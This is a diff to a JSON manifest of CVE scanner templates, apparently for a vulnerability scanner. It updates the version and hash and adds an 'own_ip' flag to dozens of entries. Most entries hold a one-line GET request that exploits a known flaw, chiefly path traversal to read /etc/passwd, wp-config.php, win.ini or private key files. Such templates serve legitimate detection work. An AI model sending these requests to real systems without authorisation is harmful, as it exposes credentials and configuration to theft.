@@ -1,6 +1,6 @@
 {
-  "version": "2026.11.1",
-  "sha256": "3ec327573b6d20d714c54f11f1b7c0b741cb2570a7bf9407fe44beb3d398594a",
+  "version": "2026.11.2",
+  "sha256": "437e867fc95611b5704effd47e02db65609f092efc3783248307579924d065c7",
   "templates": [
     {
       "id": "CVE-2001-0537",
@@ -112,7 +112,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/comm.php?id=../../../../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/comm.php?id=../../../../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2009-0545",
@@ -168,7 +169,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/adm/file.cgi?next_file=%2fetc%2fpasswd"
+      "request": "GET {{BaseURL}}/adm/file.cgi?next_file=%2fetc%2fpasswd",
+      "own_ip": true
     },
     {
       "id": "CVE-2009-1872",
@@ -220,7 +222,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd"
+      "request": "GET {{BaseURL}}/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2010-2035",
@@ -238,7 +241,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/index.php?option=com_perchagallery\u0026controller=../../../../../../../../../../etc/passwd%00"
+      "request": "GET {{BaseURL}}/index.php?option=com_perchagallery\u0026controller=../../../../../../../../../../etc/passwd%00",
+      "own_ip": true
     },
     {
       "id": "CVE-2010-2861",
@@ -272,7 +276,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2011-3600",
@@ -357,7 +362,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450\u0026skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00"
+      "request": "GET {{BaseURL}}/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450\u0026skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00",
+      "own_ip": true
     },
     {
       "id": "CVE-2014-2321",
@@ -372,7 +378,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/web_shell_cmd.gch"
+      "request": "GET {{BaseURL}}/web_shell_cmd.gch",
+      "own_ip": true
     },
     {
       "id": "CVE-2014-2908",
@@ -478,7 +485,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-admin/admin-ajax.php?action=revslider_show_image\u0026img=../wp-config.php"
+      "request": "GET {{BaseURL}}/wp-admin/admin-ajax.php?action=revslider_show_image\u0026img=../wp-config.php",
+      "own_ip": true
     },
     {
       "id": "CVE-2015-1635",
@@ -514,7 +522,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd\u0026plugintype=utilities\u0026pluginclass=CustomSQLUtility"
+      "request": "GET {{BaseURL}}/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd\u0026plugintype=utilities\u0026pluginclass=CustomSQLUtility",
+      "own_ip": true
     },
     {
       "id": "CVE-2015-2863",
@@ -548,7 +557,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/login/../../../etc/passwd"
+      "request": "GET {{BaseURL}}/login/../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2015-3897",
@@ -603,7 +613,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd\u0026filename=/etc/passwd\u0026contenttype=text/html\u0026transient=1\u0026abspath=/usr/share/wordpress"
+      "request": "GET {{BaseURL}}/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd\u0026filename=/etc/passwd\u0026contenttype=text/html\u0026transient=1\u0026abspath=/usr/share/wordpress",
+      "own_ip": true
     },
     {
       "id": "CVE-2015-7297",
@@ -638,7 +649,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php"
+      "request": "GET {{BaseURL}}/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php",
+      "own_ip": true
     },
     {
       "id": "CVE-2015-9480",
@@ -656,7 +668,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/robotcpa/f.php?l=ZmlsZTovLy9ldGMvcGFzc3dk"
+      "request": "GET {{BaseURL}}/wp-content/plugins/robotcpa/f.php?l=ZmlsZTovLy9ldGMvcGFzc3dk",
+      "own_ip": true
     },
     {
       "id": "CVE-2016-10033",
@@ -689,7 +702,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/monitoring/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd"
+      "request": "GET {{BaseURL}}/monitoring/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2016-10924",
@@ -709,7 +723,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php"
+      "request": "GET {{BaseURL}}/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php",
+      "own_ip": true
     },
     {
       "id": "CVE-2016-10960",
@@ -745,7 +760,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/themes/Newspaper/style.css"
+      "request": "GET {{BaseURL}}/wp-content/themes/Newspaper/style.css",
+      "own_ip": true
     },
     {
       "id": "CVE-2016-2389",
@@ -763,7 +779,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/XMII/Catalog?Mode=GetFileList\u0026Path=Classes/../../../../../../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/XMII/Catalog?Mode=GetFileList\u0026Path=Classes/../../../../../../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2016-3081",
@@ -867,7 +884,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+      "request": "GET {{BaseURL}}/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2017-1000170",
@@ -919,7 +937,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/%5C../ssl/yaws-key.pem"
+      "request": "GET {{BaseURL}}/%5C../ssl/yaws-key.pem",
+      "own_ip": true
     },
     {
       "id": "CVE-2017-11512",
@@ -988,7 +1007,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/.."
+      "request": "GET {{BaseURL}}/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/..",
+      "own_ip": true
     },
     {
       "id": "CVE-2017-15363",
@@ -1006,7 +1026,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/typo3conf/ext/restler/vendor/luracast/restler/public/examples/resources/getsource.php?file=../../../../../../../LocalConfiguration.php"
+      "request": "GET {{BaseURL}}/typo3conf/ext/restler/vendor/luracast/restler/public/examples/resources/getsource.php?file=../../../../../../../LocalConfiguration.php",
+      "own_ip": true
     },
     {
       "id": "CVE-2017-15944",
@@ -1111,7 +1132,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /wp-content/plugins/formidable/readme.txt HTTP/1.1"
+      "request": "GET /wp-content/plugins/formidable/readme.txt HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2017-5521",
@@ -1345,7 +1367,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/dumpmdm.cmd"
+      "request": "GET {{BaseURL}}/dumpmdm.cmd",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-0296",
@@ -1364,7 +1387,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions"
+      "request": "GET {{BaseURL}}/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-1000130",
@@ -1513,7 +1537,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json"
+      "request": "GET {{BaseURL}}/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-11511",
@@ -1546,7 +1571,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/jkstatus"
+      "request": "GET {{BaseURL}}/jkstatus",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-11776",
@@ -1580,7 +1606,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/server/node_upgrade_srv.js?action=downloadFirmware\u0026firmware=/../../../../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/server/node_upgrade_srv.js?action=downloadFirmware\u0026firmware=/../../../../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-1207",
@@ -1645,7 +1672,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-12998",
@@ -1696,7 +1724,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
+      "request": "GET {{BaseURL}}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-13980",
@@ -1713,7 +1742,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/assets/php/filebrowser/filebrowser.main.php?file=../../../../../../../../../../etc/passwd\u0026do=download"
+      "request": "GET {{BaseURL}}/assets/php/filebrowser/filebrowser.main.php?file=../../../../../../../../../../etc/passwd\u0026do=download",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-14013",
@@ -1744,7 +1774,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-14918",
@@ -1797,7 +1828,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/ipecs-cm/download?filename=../../../../../../../../../../etc/passwd\u0026filepath=/home/wms/www/data"
+      "request": "GET {{BaseURL}}/ipecs-cm/download?filename=../../../../../../../../../../etc/passwd\u0026filepath=/home/wms/www/data",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-15811",
@@ -1876,7 +1908,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/services/user/values.xml?var=STATUS"
+      "request": "GET {{BaseURL}}/services/user/values.xml?var=STATUS",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-16763",
@@ -1909,7 +1942,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/theme/default/img/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd"
+      "request": "GET {{BaseURL}}/theme/default/img/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-17207",
@@ -1943,7 +1977,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026apis=../../../../../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026apis=../../../../../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-17254",
@@ -2034,7 +2069,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/jasperserver-pro/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../js.jdbc.properties"
+      "request": "GET {{BaseURL}}/jasperserver-pro/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../js.jdbc.properties",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-19207",
@@ -2066,7 +2102,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/enginemanager/server/logs/download?logType=error\u0026logName=../../../../../../../../etc/passwd\u0026logSource=engine"
+      "request": "GET {{BaseURL}}/enginemanager/server/logs/download?logType=error\u0026logName=../../../../../../../../etc/passwd\u0026logSource=engine",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-19410",
@@ -2133,7 +2170,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/_s_/dyn/Log_highlight?href=../../../../windows/win.ini\u0026n=1#selected"
+      "request": "GET {{BaseURL}}/_s_/dyn/Log_highlight?href=../../../../windows/win.ini\u0026n=1#selected",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-25114",
@@ -2235,7 +2273,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../wp-config.php"
+      "request": "GET {{BaseURL}}/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../wp-config.php",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-7600",
@@ -2337,7 +2376,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php"
+      "request": "GET {{BaseURL}}/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-9205",
@@ -2353,7 +2393,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2018-9995",
@@ -2530,7 +2571,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
+      "request": "GET {{BaseURL}}/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-11581",
@@ -2582,7 +2624,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/LetsEncrypt/Index?fileName=/etc/passwd"
+      "request": "GET {{BaseURL}}/LetsEncrypt/Index?fileName=/etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-12314",
@@ -2598,7 +2641,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd"
+      "request": "GET {{BaseURL}}/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-12593",
@@ -2614,7 +2658,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+      "request": "GET {{BaseURL}}/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-12725",
@@ -2664,7 +2709,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /wan.htm HTTP/1.1"
+      "request": "GET /wan.htm HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-13372",
@@ -2729,7 +2775,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php"
+      "request": "GET {{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-14223",
@@ -2833,7 +2880,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/cgi-bin/config.exp"
+      "request": "GET {{BaseURL}}/cgi-bin/config.exp",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-16759",
@@ -2948,7 +2996,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /jnoj/web/polygon/problem/viewfile?id=1\u0026name=../../../../../../../etc/passwd HTTP/1.1"
+      "request": "GET /jnoj/web/polygon/problem/viewfile?id=1\u0026name=../../../../../../../etc/passwd HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-17564",
@@ -3003,7 +3052,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/api-third-party/download/extdisks../etc/passwd"
+      "request": "GET {{BaseURL}}/api-third-party/download/extdisks../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-18393",
@@ -3019,7 +3069,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/plugins/search/..\\..\\..\\conf\\openfire.xml"
+      "request": "GET {{BaseURL}}/plugins/search/..\\..\\..\\conf\\openfire.xml",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-19781",
@@ -3036,7 +3087,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/vpn/../vpns/cfg/smb.conf"
+      "request": "GET {{BaseURL}}/vpn/../vpns/cfg/smb.conf",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-19825",
@@ -3071,7 +3123,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-admin/admin.php?page=download_report\u0026report=users\u0026status=all"
+      "request": "GET {{BaseURL}}/wp-admin/admin.php?page=download_report\u0026report=users\u0026status=all",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-20085",
@@ -3090,7 +3143,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"
+      "request": "GET {{BaseURL}}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-20933",
@@ -3145,7 +3199,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-admin/admin-ajax.php?action=aam-media-load\u0026aam-media=/wp-config.php"
+      "request": "GET {{BaseURL}}/wp-admin/admin-ajax.php?action=aam-media-load\u0026aam-media=/wp-config.php",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-2588",
@@ -3160,7 +3215,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa\u0026documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini"
+      "request": "GET {{BaseURL}}/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa\u0026documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-2725",
@@ -3230,7 +3286,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}"
+      "request": "GET {{BaseURL}}",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-5127",
@@ -3334,7 +3391,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /wp-content/plugins/total-donations/readme.txt HTTP/1.1"
+      "request": "GET /wp-content/plugins/total-donations/readme.txt HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-7192",
@@ -3405,7 +3463,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/?c=../../../../../../etc/passwd%00"
+      "request": "GET {{BaseURL}}/?c=../../../../../../etc/passwd%00",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-7256",
@@ -3506,7 +3565,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds\u0026cfg=../../../../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds\u0026cfg=../../../../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2019-9670",
@@ -3695,7 +3755,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-11515",
@@ -3791,7 +3852,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-admin/admin-ajax.php?action=duplicator_download\u0026file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      "request": "GET {{BaseURL}}/wp-admin/admin-ajax.php?action=duplicator_download\u0026file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-11798",
@@ -3926,7 +3988,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/fw.progrss.details.php?popup=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      "request": "GET {{BaseURL}}/fw.progrss.details.php?popup=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-13167",
@@ -4044,7 +4107,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/analytics/saw.dll?bieehome\u0026startPage=1"
+      "request": "GET {{BaseURL}}/analytics/saw.dll?bieehome\u0026startPage=1",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-14883",
@@ -4246,7 +4310,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+      "request": "GET {{BaseURL}}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-17530",
@@ -4280,7 +4345,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/vtigercrm/libraries/"
+      "request": "GET {{BaseURL}}/vtigercrm/libraries/",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-1943",
@@ -4424,7 +4490,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/config/getuser?index=0"
+      "request": "GET {{BaseURL}}/config/getuser?index=0",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-2551",
@@ -4460,7 +4527,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s"
+      "request": "GET {{BaseURL}}/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-26073",
@@ -4475,7 +4543,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd"
+      "request": "GET {{BaseURL}}/dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-26836",
@@ -4508,7 +4577,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-json/wp/v2/lesson/1"
+      "request": "GET {{BaseURL}}/wp-json/wp/v2/lesson/1",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-26879",
@@ -4708,7 +4778,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026default-language\u0026lang=../"
+      "request": "GET {{BaseURL}}/+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026default-language\u0026lang=../",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-35131",
@@ -4755,7 +4826,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/searchblox/servlet/FileServlet?col=9\u0026url=/etc/passwd"
+      "request": "GET {{BaseURL}}/searchblox/servlet/FileServlet?col=9\u0026url=/etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-3580",
@@ -4823,7 +4895,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/"
+      "request": "GET {{BaseURL}}/",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-36719",
@@ -4840,7 +4913,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/themes/listingpro/style.css"
+      "request": "GET {{BaseURL}}/wp-content/themes/listingpro/style.css",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-36723",
@@ -4858,7 +4932,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/wp-admin/index.php?download-lp-users=yes"
+      "request": "GET {{BaseURL}}/wp-admin/index.php?download-lp-users=yes",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-3952",
@@ -4926,7 +5001,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/_next/static/../server/pages-manifest.json"
+      "request": "GET {{BaseURL}}/_next/static/../server/pages-manifest.json",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-5410",
@@ -4945,7 +5021,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"
+      "request": "GET {{BaseURL}}/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-5847",
@@ -5141,7 +5218,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd"
+      "request": "GET {{BaseURL}}/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-8497",
@@ -5156,7 +5234,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/pandora_console/attachment/pandora_chat.log.json.txt"
